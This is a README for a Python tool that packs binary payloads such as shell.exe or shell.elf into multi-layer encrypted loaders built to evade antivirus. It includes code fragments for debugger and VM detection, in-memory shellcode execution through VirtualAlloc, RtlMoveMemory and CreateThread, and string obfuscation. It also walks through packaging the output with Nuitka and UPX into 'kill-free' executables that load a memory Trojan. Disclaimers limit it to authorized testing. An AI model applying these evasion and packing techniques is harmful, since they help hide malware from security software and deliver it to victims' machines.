# 🧬 ChenYanXi · Advanced multi-layer encryption and anti-killing shell generator

> 👤 Author: **Mingshenhk**
> 🎯 Purpose: Security research / shell experiment / anti-killing test
> ⚠️ **Disclaimer: This tool is limited to teaching and authorized testing, and is prohibited from being used for any illegal purpose! **

---

## 📖 Project Overview

**ChenYanXi** is an advanced shell generation framework designed for security researchers and red team testers. It is based on Python implementation and integrates core technologies such as multi-layer dynamic encryption, control flow disruption, virtual machine detection, and fileless execution.

It can encapsulate binary Payloads (such as `.elf`, `.exe`) into complex Python shells, with **strong anti-analysis capabilities, extremely low detection and killing rates, and multi-platform compatibility**, and can further generate highly hidden single-file executable programs through Nuitka.

---

## ✨ Features

| Module | Description |
| ------------------ | ----------------------------------- |
| 🔐 **Multi-layer encryption + compression** | Supports up to 18 layers of `zlib` + AES/DES hybrid encryption |
| 🔑 **Dynamic key derivation** | Use `PBKDF2-HMAC-SHA256` to derive salted keys, each layer is different |
| 🌀 **Control flow camouflage** | Automatically insert harmless branches to disrupt program flow analysis |
| 🔎 **Anti-sandbox / anti-debugging / anti-capture** | Detect VM, debugger, and capture device, and exit immediately once hit |
| 🧱 **String obfuscation** | All sensitive strings `chr()` are concatenated to avoid feature matching |
| 🧬 **Memory load and execute** | Only load into RAM to avoid disk drop and anti-virus software scanning |
| 🗂️ **Registry pseudo-residence (simulation)** | Virtually add startup items, no real write, confuse analyzer |

---

## ⚙️ Technical principle

### 🔐 Multi-layer encryption logic

Each layer performs the following processing:

1. The original data is compressed using `zlib`

2. Add disguised bytes to interfere with feature recognition

3. Randomly use AES or DES (CBC) symmetric encryption

4. The encryption result is then encapsulated in Base64

Up to **up to 18 layers of nested processing**, building an "onion shell", which is extremely difficult to reverse.

---

### 🔑 Key derivation design

Each layer uses independent keys and IVs, derived as follows:

```python
hashlib.pbkdf2_hmac("sha256", secret, salt, 100000, dklen=32)
```

* Both `secret` and `salt` are generated using `get_random_bytes()`
* Prevent key reuse and static pattern recognition

---

### 🌀 Control flow + string obfuscation example

Disguise control flow statements:

```python
if random.random() < 0.99:
pass # Control flow noise
```

Key string obfuscation (e.g. registry path):

```python
reg_key = chr(83)+chr(111)+chr(102)+chr(116)+...
```

---

### 🔍 Sandbox / debug detection code

```python
def is_debugged():
return ctypes.windll.kernel32.IsDebuggerPresent()

def is_vm():
return any(x in platform.platform().lower() for x in ["vbox", "vmware", "qemu", "sandbox"])
```

If the detection is hit, terminate the execution immediately.

---

### 🧬 Memory loading and execution mechanism (Windows)

```python
ptr = VirtualAlloc(...)
RtlMoveMemory(ptr, payload, ...)
CreateThread(..., ptr, ...)
```

* The whole process runs in memory
* No files are dropped, avoiding most antivirus detection

---

## Use command

---
```
usage: chenyanxi.exe [-h] [-l LAYERS] [--no-drop] payload

OR

usage:./chenyanxi [-h] [-l LAYERS] [--no-drop] payload

positional arguments:
payload file that can execute the payload (e.g., shell.exe, shell.elf)

options:
-h, --help show this help message and exit
-l LAYERS, --layers LAYERS
Encryption layer (1-18), default is 3
--no-drop Run only in memory
```
---

## 🚀 Usage

1. Prepare a binary Payload (such as `.elf`, `.exe`), named:

```
shell.elf

shell.exe
```

2. Run the shell generator:

```bash
./chenyanxi -l 18 shell.elf

or

chenyanxi.exe -l 18 shell.exe
```

3. The output result is a kill-free shell script:

```
packed_shell.py
```

---

## 🧰 Project structure

```
chenyanxi/
├── chenyanxi # Main generator script
├── shell.elf # Sample Payload (binary)
├── shell.exe
├── chenyanxi.exe
├── ultra_shell.py # Output Python with shell Trojan
├── image/ # Screenshot directory
└── README.md # This document
```
---
## 🧪 Windows packaging suggestions (Nuitka)

Installation dependencies:
```
pip install pycryptodome psutil nuitka
```
Use Nuitka packaging:
```
nuitka --mingw64 --standalone --onefile packed_shell.py

```

Final output:
```
packed_shell.exe

```
---

## 🧪 Linux packaging suggestions (Nuitka + UPX)

Installation dependencies:

```bash
sudo apt update
pip install nuitka pycryptodome psutil
sudo apt install patchelf upx makeself
```

Use Nuitka packaging:

```bash
nuitka --follow-imports --standalone --onefile packed_shell.py
```

Compress the main executable file:

```bash
strip packed_shell.dist/packed_shell.bin
upx -9 packed_shell.dist/packed_shell.bin
```

Generate a single file running package:

```bash
sudo apt install makeself
makeself --nox11 packed_shell.dist/ packed_shell.run "Packed Shell Installer" ./packed_shell.bin
```

Final output:

```
packed_shell.run ← can be directly executed, automatically decompressed + load memory Trojan
```
Result:

<img src="image/Screenshot 2025-06-24 185736.png" width="600"/>
<img src="image/Screenshot 2025-06-24 185655.png" width="600"/>

Or you can use pyinstaller for win and Linux (not recommended):

```
pyinstaller --onefile packed_shell.py
```

<img src="image/Screenshot 2025-06-24 185736.png" width="600"/>
<img src="image/Screenshot 2025-06-24 185656.png" width="600"/>
---

## 📌 Notes

* Project dependencies:

```bash
pip install pycryptodome psutil nuitka
```
* By default, it targets Windows platform (including `winreg`, `ctypes.windll`). If used for Linux, there may be some unknown problems;

* It is recommended to use tools such as `pyarmor` and `obfuscator-llvm` to further add shell obfuscation.

---

## 📢 Disclaimer

> This project is only for legal authorized testing, teaching and research purposes. It is forbidden to use this tool for any illegal behavior. Violators will be at their own risk and the author will not be responsible!

---

## ⭐ Acknowledgements and References

* [PyCryptodome](https://github.com/Legrandin/pycryptodome) - Advanced encryption library

* [Metasploit Framework](https://github.com/rapid7/metasploit-framework)

* [Veil Framework](https://github.com/Veil-Framework/Veil)

* APT memory shell research literature, reverse and shell technology research team

---

## ❤️ Support the project

If you think this project is helpful, please click ⭐Star to support it!
Welcome to fork, issue, submit PR to improve it together!

---

